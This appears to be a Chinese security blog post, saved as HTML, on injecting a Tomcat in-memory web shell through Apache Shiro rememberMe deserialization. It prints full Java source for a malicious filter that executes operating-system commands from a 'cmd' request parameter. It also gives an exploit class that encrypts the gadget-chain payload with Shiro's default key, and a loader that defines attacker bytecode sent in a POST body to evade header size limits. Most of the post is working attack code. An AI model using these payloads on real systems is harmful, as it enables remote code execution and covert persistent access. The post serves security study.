@@ -1,0 +1,445 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+     
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<title>Shiro反序列化注入内存马 | ch1e的随笔</title>
+<meta name="author" content="ch1e">
+<meta name="copyright" content="ch1e">
+
+<link rel="shortcut icon" href="https://ch1e.cn/img/favicon.ico"> 
+
+
+    <meta name="keywords" content="web安全,Java安全,反序列化">
+
+
+
+     
+    <meta name="description" content="前言之前学习了shiro反序列化以及Tomcat和Spring的一些内存马，但是一直没有把两者结合进行利用，今天来学习如何通过shiro反序列化注入内存马，这里其实我是先尝试了很久才写的文章，提前预告一下我踩了很久的坑，在注入内存马的时候我这里一直注入不了，但是同样的方式在别的师傅那能注入成功，我到现在也没搞明白。 Shiro反序列化注入内存马之前在学内存马的时候是知道动态注册一个Filter，但">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro反序列化注入内存马">
+<meta property="og:url" content="https://ch1e.cn/2022/05/07/shiroMemory/">
+<meta property="og:site_name" content="ch1e的随笔">
+<meta property="og:description" content="前言之前学习了shiro反序列化以及Tomcat和Spring的一些内存马，但是一直没有把两者结合进行利用，今天来学习如何通过shiro反序列化注入内存马，这里其实我是先尝试了很久才写的文章，提前预告一下我踩了很久的坑，在注入内存马的时候我这里一直注入不了，但是同样的方式在别的师傅那能注入成功，我到现在也没搞明白。 Shiro反序列化注入内存马之前在学内存马的时候是知道动态注册一个Filter，但">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+<meta property="article:published_time" content="2022-05-07T13:32:48.833Z">
+<meta property="article:modified_time" content="2022-05-08T15:18:22.558Z">
+<meta property="article:author" content="ch1e">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+ 
+
+<meta http-equiv="Cache-Control" content="no-siteapp"/>
+<link href="//cdn.jsdelivr.net" rel="preconnect">
+<link href="https://ch1e.cn" rel="prefetch">
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css " rel="stylesheet">
+<link href="/css/main.css " rel="stylesheet">
+<script src="/js/utlis.js"></script>
+ 
+    
+ 
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+     
+    
+ 
+     
+
+<script>
+    var $config = {
+        tocStyle: "visible",
+        CDN:{
+            fancyboxJs: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js",
+            fancyboxCss: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css"
+        },
+        
+        
+    }
+</script>
+    
+
+
+
+
+  
+
+
+    <div id="body-wrap">
+        <nav id="nav-wrap">
+  <div class="navbar">
+    <div class="bar">
+      <a href="/" class="title">ch1e的随笔</a>
+
+      
+      <ul class="menu">
+         
+        <li><a href="/">首页</a></li>
+          
+        <li>
+          <a class="menu-child-hover" href="javascript:void(0);">找文章</a>
+          <ul class="menu-child">
+            
+            <li><a href='/tags'>标签</a></li>
+            
+            <li><a href='/archives'>归档</a></li>
+            
+          </ul>
+        </li>
+          
+        <li><a href="/link">友情链接</a></li>
+         
+      </ul>
+      <i class="fas fa-bars open-nav"></i>
+    </div>
+  </div>
+  <div id="mobile-nav">
+    <ul>
+       
+      <li><a href="/">首页</a></li>
+         
+      <li><a href='/tags'>标签</a></li>
+      
+      <li><a href='/archives'>归档</a></li>
+         
+      <li><a href="/link">友情链接</a></li>
+       
+    </ul>
+  </div>
+</nav>
+
+
+        <main id="main">
+            
+
+<article id="post">
+  <div class="post-info">
+    <div class="post-title">
+      <h1>Shiro反序列化注入内存马</h1>
+    </div>
+    <div class="post-meta">
+      <div class="post-date">
+        <i class="far fa-calendar-alt fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          发表于
+            2022-05-07 |
+        </span>
+        
+        <i class="fas fa-history fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          更新于
+            2022-05-08
+        </span>
+      </div>
+      <div class="post-meta-wordcount">
+        <i class="far fa-file-word fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">总字数:</span>
+        <span class="word-count">2.5k | </span>
+        <i class="far fa-clock fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">阅读时长:</span>
+        <span>12分钟</span>
+        
+      </div>
+    </div>
+  </div>
+  <div class="post-content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学习了shiro反序列化以及Tomcat和Spring的一些内存马，但是一直没有把两者结合进行利用，今天来学习如何通过shiro反序列化注入内存马，这里其实我是先尝试了很久才写的文章，提前预告一下我踩了很久的坑，在注入内存马的时候我这里一直注入不了，但是同样的方式在别的师傅那能注入成功，我到现在也没搞明白。</p>
+<h1 id="Shiro反序列化注入内存马"><a href="#Shiro反序列化注入内存马" class="headerlink" title="Shiro反序列化注入内存马"></a>Shiro反序列化注入内存马</h1><p>之前在学内存马的时候是知道动态注册一个Filter，但是当时是通过jsp去动态注册Filter，但是使用反序列化去注入内存马确实没怎么仔细想，今天准备学习的时候看到师傅们的Exp，其实就明白了，就是通过TemplatesImpl去加载恶意类，然后把动态注册Filter的代码写在反序列化的类的static方法中。这里的话内存马的内容就不说了，想看的师傅可以看之前的笔记。这里我也用了P牛的环境，项目代码地址：<a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings%E3%80%82%E5%9B%A0%E4%B8%BA%E6%9C%89%E6%9C%80%E5%A4%A7%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%9A%84%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E5%9C%A8Tomcat%E7%9A%84/conf/server.xml%E4%B8%AD%E8%BF%9B%E8%A1%8C%E5%A6%82%E4%B8%8B%E4%BF%AE%E6%94%B9%EF%BC%8C%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%60maxHttpHeaderSize=&quot;40960000&quot;%60%E5%8D%B3%E5%8F%AF%E3%80%82">https://github.com/phith0n/JavaThings。因为有最大请求头的长度限制，所以我们需要在Tomcat的/conf/server.xml中进行如下修改，添加一个`maxHttpHeaderSize=&quot;40960000&quot;`即可。</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">           connectionTimeout=&quot;20000&quot;</span><br><span class="line">           redirectPort=&quot;8443&quot; maxHttpHeaderSize=&quot;40960000&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接使用P牛的shiroattack里的CommonsBeanutils1Shiro这条链，注入内存马的话，我们需要自己构造一个内存马。因为他要使用CommonsBeanutils1Shiro这条链，被TemplatesImpl类加载，需要继承AbstractTranslet类，我们也同时可以让他实现Filter接口，变成一个恶意的Filter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoFilter</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以在他的static部分完成注册Filter的操作，在doFilter中写入命令执行的功能，其实这个内存马和之前的jsp的内存马不同的地方就是，我们需要用另外一种方式来获取到standardContext，具体的姿势可以学习<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914%E3%80%82%E8%BF%99%E9%87%8C%E5%B0%B1%E7%9B%B4%E6%8E%A5%E7%BB%99%E5%87%BA%E4%BD%BF%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC">https://xz.aliyun.com/t/9914。这里就直接给出使用的内存马</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BehinderFilter</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> String name = <span class="string">&quot;evil&quot;</span>;</span><br><span class="line">            <span class="keyword">final</span> String URLPattern = <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">            <span class="comment">//获取上下文</span></span><br><span class="line">            WebappClassLoaderBase webappClassLoaderBase =</span><br><span class="line">                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">            Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">            BehinderFilter behinderFilter = <span class="keyword">new</span> BehinderFilter();</span><br><span class="line"></span><br><span class="line">            FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">            filterDef.setFilter(behinderFilter);</span><br><span class="line">            filterDef.setFilterName(name);</span><br><span class="line">            filterDef.setFilterClass(behinderFilter.getClass().getName());</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">            filterMap.addURLPattern(URLPattern);</span><br><span class="line">            filterMap.setFilterName(name);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">            filterConfigs.put(name, filterConfig);</span><br><span class="line">            System.out.println(filterConfigs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Do Filter ......&quot;</span>);</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>弄完对应的内存马，我们需要获得经过shiro的key通过aes加密并且base64编码后的结果，这里可以参照p牛的shiroattack里的Client去写，通过javassist读取一个类的class，然后对他进行加密编码后进行输出</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.govuln.shiroattack.CommonsBeanutils1Shiro;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(com.govuln.shiroattack.BehinderFilter.class.getName());</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = <span class="keyword">new</span> CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有个小坑:需要在pom文件中添加如下包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.27.0-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后运行Exp类即可得到对应的rememberMe的值，传入即可注入内存马，因为这里我本地打了两天也没打出来，估计是哪里存在点问题，但是相同的打法我在Le1a师傅那可以成功完成注入，这里就直接上在Le1a师傅那注入成功的截图了<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220508145619923.png" alt="image-20220508145619923"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220508145656129.png" alt="image-20220508145656129"></p>
+<h1 id="绕过请求头长度限制注入内存马"><a href="#绕过请求头长度限制注入内存马" class="headerlink" title="绕过请求头长度限制注入内存马"></a>绕过请求头长度限制注入内存马</h1><p>上面说到注入内存马是修改了Tomcat的最大请求头才能注入成功，正常情况下注入内存马是会爆400状态码的，所以在实战中我们需要绕过这个长度限制，达到注入内存马的目的。下面就来学习一下。主要绕过方法应该有三种</p>
+<ul>
+<li>修改maxHTTPHeaderSize</li>
+<li>反序列化一个加载器，从POST请求体中发送恶意字节码</li>
+<li>class bytes使用gzip+base64压缩编码</li>
+</ul>
+<p>实验环境:<a target="_blank" rel="noopener" href="https://github.com/yyhuni/shiroMemshell/tree/master/springboot-shiro">https://github.com/yyhuni/shiroMemshell/tree/master/springboot-shiro</a></p>
+<p>主要来看看第二种吧。比较推荐第二种方法，就是在post请求体中发送加密编码后的恶意Filter。因此我们这里要获取到request，response和session，还需要一个参数，把字节码传入然后调用defineClass动态加载此类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();</span><br><span class="line">            java.lang.reflect.Field r=request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            r.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();</span><br><span class="line">            javax.servlet.http.HttpSession session = request.getSession();</span><br><span class="line"></span><br><span class="line">            String classData=request.getParameter(<span class="string">&quot;classData&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] classBytes = <span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(classData);</span><br><span class="line">            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,<span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class&#125;);</span><br><span class="line">            defineClassMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, <span class="number">0</span>,classBytes.length);</span><br><span class="line">            cc.newInstance().equals(<span class="keyword">new</span> Object[]&#123;request,response,session&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM arg0, SerializationHandler[] arg1)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后还是使用Exp生成rememberMe的值<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220508202827999.png" alt="image-20220508202827999"></p>
